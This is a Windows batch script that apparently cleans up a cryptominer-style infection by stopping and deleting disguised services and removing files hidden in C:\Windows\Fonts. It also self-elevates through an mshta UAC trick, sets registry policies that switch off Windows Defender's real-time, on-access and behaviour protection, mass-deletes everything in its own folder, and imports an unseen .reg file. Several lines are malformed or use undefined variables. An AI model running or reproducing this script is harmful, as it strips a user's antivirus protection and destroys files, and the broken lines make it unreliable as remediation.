@echo off 

%1 mshta vbscript:CreateObject("Shell.Application").ShellExecute("cmd.exe","/c %~s0 ::","","runas",1)(window.close)&&exit  
cd /d "%~dp0" 

reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows Defender" /v Real-Time Protection /t REG_DWORD /d 1 /f
reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows Defender" /v DisableAntiSpyware /t REG_DWORD /d 1 /f
reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows Defender" /v DisableOnAccessProtection /t REG_DWORD /d 1 /f
reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows Defender" /v DisableBehaviorMonitoring /t REG_DWORD /d 1 /f
REG DELETE "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\taskmgr.exe"  /f
reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System /v DisableTaskMgr /t REG_DWORD /d 0 /f
sc.exe sdset WindowsNT D:(A;;CCLCSWRPWPDTLOCRRC;;;SY)(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;BA)(A;;CCLCSWLOCRRC;;;IU)(A;;CCLCSWLOCRRC;;;SU)
sc.exe sdset WindowsAIx D:(A;;CCLCSWRPWPDTLOCRRC;;;SY)(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;BA)(A;;CCLCSWLOCRRC;;;IU)(A;;CCLCSWLOCRRC;;;SU)
sc.exe sdset winupdate D:(A;;CCLCSWRPWPDTLOCRRC;;;SY)(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;BA)(A;;CCLCSWLOCRRC;;;IU)(A;;CCLCSWLOCRRC;;;SU)
sc.exe sdset Tex D:(A;;CCLCSWRPWPDTLOCRRC;;;SY)(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;BA)(A;;CCLCSWLOCRRC;;;IU)(A;;CCLCSWLOCRRC;;;SU)
sc.exe sdset Texi D:(A;;CCLCSWRPWPDTLOCRRC;;;SY)(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;BA)(A;;CCLCSWLOCRRC;;;IU)(A;;CCLCSWLOCRRC;;;SU)
sc.exe sdset FirefoxInstall D:(A;;CCLCSWRPWPDTLOCRRC;;;SY)(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;BA)(A;;CCLCSWLOCRRC;;;IU)(A;;CCLCSWLOCRRC;;;SU)
sc.exe sdset fix D:(A;;CCLCSWRPWPDTLOCRRC;;;SY)(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;BA)(A;;CCLCSWLOCRRC;;;IU)(A;;CCLCSWLOCRRC;;;SU)
sc stop Windowsnsi
sc stop ServiceManager
sc stop CssService
sc stop winUpdate
sc stop WindowsNT
sc stop WindowsNTM
sc stop winupdate
sc stop Tex
sc stop fix
sc stop Texi
sc stop FirefoxInstall
sc stop Servicos
sc stop FirefoxInstall
sc stop WindowsAIx
sc.exe delete Windowsnsi
sc.exe delete WindowsNTM
sc.exe delete ServiceManager
sc.exe delete CssService
sc.exe delete winUpdate
sc.exe delete WindowsNT
sc.exe delete Servicos
sc.exe delete WindowsAIx
sc.exe delete FirefoxInstall
sc.exe delete WindowsNT
sc.exe delete Servicos
sc delete winupdate
sc delete Tex
sc delete fix
sc delete Texi
sc delete FirefoxInstall
ATTRIB -H -S /s /d C:\Windows\Fonts\*.*
del /q "C:\Windows\Fonts\mst.bat"
del /q "C:\Windows\Fonts\EppManifest.dll"
del /q "C:\Windows\Fonts\MpAsDesc.dll"
del /q "C:\Windows\Fonts\MpClient.dll"
del /q "C:\Windows\Fonts\MpOAV.dll"
del /q "C:\Windows\Fonts\mr - Copy.bat"
del /q "C:\Windows\Fonts\mr.bat"
del /q "C:\Windows\Fonts\MsMpjlb.bat"
del /q "C:\Windows\Fonts\MsMpLics.dll"
del /q "C:\Windows\Fonts\mst.bat"
del /q "C:\Windows\Fonts\sa.bat"
del /q "C:\Windows\Fonts\t.reg"
del /q "C:\Windows\Fonts\MpOAV.dll"
del /q "C:\Windows\Fonts\config.json"
del /q "C:\Windows\Fonts\explorer.exe"
del /q "C:\Windows\Fonts\MpClientRtl.exe"
del /q "C:\Windows\Fonts\MsMpjlb.bat"
del /q "C:\Windows\Fonts\sa.bat"
del /q "C:\Windows\Fonts\sat.bat"
del /q "C:\Windows\Fonts\un.exe"
rmdir *.*
del /q *.*
TaskList /FI "ImageName EQ %processName%" 2>nul|Find /I %processName%>nul||(
sc start "%SERVICE_NAME%"
)
C:\Windows\regedit /s MsMpLicns.reg

net accounts /forcelogoff:no

pause
exit